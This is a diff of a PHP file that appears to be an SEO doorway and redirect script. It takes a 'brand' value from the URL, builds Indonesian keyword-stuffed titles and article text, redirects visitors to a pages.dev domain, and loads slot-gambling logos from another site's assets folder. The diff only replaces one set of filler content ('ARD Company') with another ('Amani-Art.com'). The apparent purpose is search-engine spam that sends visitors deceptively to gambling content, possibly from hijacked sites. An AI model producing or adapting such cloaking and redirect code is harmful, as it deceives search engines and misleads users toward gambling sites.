@@ -62,14 +62,14 @@ if (isset($_GET['ID_id'])) {
     $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
     // SEO DATA (AUTO GENERATE)
-    $title = "$BRAND x ARD Company: Mengenal Bisnis dan Layanan Profesional di Era Digital";
+    $title = "$BRAND x Amani-Art.com – Inspirasi Seni dan Karya Kreatif";
 
-    $description = "$BRAND x Pelajari peran ARD Company dalam perkembangan bisnis modern melalui strategi, inovasi, teknologi digital, efisiensi operasional, dan peluang pertumbuhan.";
+    $description = "$BRAND x Jelajahi Amani-Art.com sebagai sumber inspirasi seni, kreativitas, karya visual, dan berbagai ide menarik untuk mengembangkan apresiasi terhadap dunia seni.";
     
-    $artikel = "$BRAND x Dalam kondisi tersebut, ARD Company dapat ditempatkan dalam konteks perkembangan bisnis modern yang menggabungkan strategi, teknologi, inovasi, dan pengelolaan sumber daya secara lebih terintegrasi.";
+    $artikel = "$BRAND x Amani-Art.com hadir sebagai sebuah ruang yang dapat menjadi referensi bagi siapa saja yang memiliki ketertarikan terhadap dunia seni dan kreativitas. Seni tidak hanya berkaitan dengan hasil karya yang indah secara visual, tetapi juga menjadi media untuk menyampaikan gagasan, perasaan, identitas, dan perspektif seseorang terhadap lingkungan di sekitarnya.";
 
     // Bisa diganti random image atau CDN sendiri
-    $image = "https://i.pinimg.com/1200x/f6/49/c7/f649c7b6940762e3ba1d8fc49b810cda.jpg";
+    $image = "https://i.pinimg.com/1200x/34/4e/95/344e953a909829d84f9efc278138c245.jpg";
 
     // Canonical URL
     $canonical = $current_url;
@@ -79,7 +79,7 @@ if (isset($_GET['ID_id'])) {
 }
 
 // Redirect target
-$ampmek = "https://ard-company.pages.dev/?ID_id=$BRAND";
+$ampmek = "https://amani-art.pages.dev/?ID_id=$BRAND";
 $logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 $favicon = "https://www.residentviews.com/assets/icon/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 ?>
